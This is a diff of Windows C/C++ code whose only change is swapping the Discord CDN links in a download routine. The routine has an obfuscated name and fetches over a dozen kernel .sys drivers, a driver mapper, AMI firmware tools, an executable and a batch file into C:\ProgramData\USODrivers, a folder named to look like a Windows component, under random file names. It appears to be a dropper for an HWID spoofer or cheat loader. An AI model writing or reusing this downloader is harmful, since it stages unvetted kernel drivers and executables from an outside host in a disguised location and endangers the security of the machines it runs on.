@@ -59,26 +59,26 @@ void XKRJNTPMDGQD()
 	// Download de todos arquivos!!
 	if (_mkdir("C:\\ProgramData\\USODrivers") == -1)
 	// Download de todos arquivos .sys
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673890290536498/1.sys", "C:\\ProgramData\\USODrivers\\QNRVFKRZLLIU.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673908900663336/2.sys", "C:\\ProgramData\\USODrivers\\JWBQTQNQMCEY.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673917306048632/3.sys", "C:\\ProgramData\\USODrivers\\YSAPBUSWYIIL.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673925451395122/4.sys", "C:\\ProgramData\\USODrivers\\UNYQOMJVKVJD.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673934825664582/5.sys", "C:\\ProgramData\\USODrivers\\KBEARJQNCHMY.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673953364496485/6.sys", "C:\\ProgramData\\USODrivers\\EUIPJSHHFYZX.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673967608340541/7.sys", "C:\\ProgramData\\USODrivers\\STPWJWYERJZR.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673978756804688/8.sys", "C:\\ProgramData\\USODrivers\\GMLALPWSXWXH.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673986117812234/9.sys", "C:\\ProgramData\\USODrivers\\JENCTLDFHMAY.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039673993327824944/10.sys", "C:\\ProgramData\\USODrivers\\HJHVDXALXMVX.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039674003956174929/11.sys", "C:\\ProgramData\\USODrivers\\KGFXNQACUPUW.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039674012063764510/12.sys", "C:\\ProgramData\\USODrivers\\YYRNTIGJZIMB.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039673718798032926/1039674019542220910/13.sys", "C:\\ProgramData\\USODrivers\\GJYMORUSWAPH.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039680906291593388/1061312491457617941/amide.sys", "C:\\ProgramData\\USODrivers\\amide.sys", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039680906291593388/1061312491155624016/amifldrv64.sys", "C:\\ProgramData\\USODrivers\\amifldrv64.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628546319061152/1.sys", "C:\\ProgramData\\USODrivers\\QNRVFKRZLLIU.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628546679767090/2.sys", "C:\\ProgramData\\USODrivers\\JWBQTQNQMCEY.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628546998538421/3.sys", "C:\\ProgramData\\USODrivers\\YSAPBUSWYIIL.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628547371827260/4.sys", "C:\\ProgramData\\USODrivers\\UNYQOMJVKVJD.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628547732541551/5.sys", "C:\\ProgramData\\USODrivers\\KBEARJQNCHMY.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628544339345598/6.sys", "C:\\ProgramData\\USODrivers\\EUIPJSHHFYZX.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628544687493160/7.sys", "C:\\ProgramData\\USODrivers\\STPWJWYERJZR.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628545098518528/8.sys", "C:\\ProgramData\\USODrivers\\GMLALPWSXWXH.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628545492779158/9.sys", "C:\\ProgramData\\USODrivers\\JENCTLDFHMAY.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628545920618606/10.sys", "C:\\ProgramData\\USODrivers\\HJHVDXALXMVX.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628575125553163/11.sys", "C:\\ProgramData\\USODrivers\\KGFXNQACUPUW.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628575523995669/12.sys", "C:\\ProgramData\\USODrivers\\YYRNTIGJZIMB.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628575888920586/13.sys", "C:\\ProgramData\\USODrivers\\GJYMORUSWAPH.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628576228655154/amide.sys", "C:\\ProgramData\\USODrivers\\amide.sys", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628573502361691/amifldrv64.sys", "C:\\ProgramData\\USODrivers\\amifldrv64.sys", 0, NULL);
 	// Download de todos arquivos .exe & .bat
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039970083860131860/1039976408103002132/Ligthmapper.exe", "C:\\ProgramData\\USODrivers\\Ligthmapper.exe", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039680906291593388/1061312490832674826/AMIDEWINx64.exe", "C:\\ProgramData\\USODrivers\\AMIDEWINx64.exe", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1039683146691661885/1039683205692923944/oi.exe", "C:\\ProgramData\\USODrivers\\ZUECDTVIAQLY.exe", 0, NULL);
-	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1059248471196057640/1059248687919927306/beta.bat", "C:\\ProgramData\\USODrivers\\YSWQBBEJWGPF.bat", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628574362173501/Ligthmapper.exe", "C:\\ProgramData\\USODrivers\\Ligthmapper.exe", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628573141631086/AMIDEWINx64.exe", "C:\\ProgramData\\USODrivers\\AMIDEWINx64.exe", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628574764847184/oi.exe", "C:\\ProgramData\\USODrivers\\ZUECDTVIAQLY.exe", 0, NULL);
+	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/1071628012463853612/1071628574022451300/beta.bat", "C:\\ProgramData\\USODrivers\\YSWQBBEJWGPF.bat", 0, NULL);
 }
 
 void OICXSXOPZFAK()
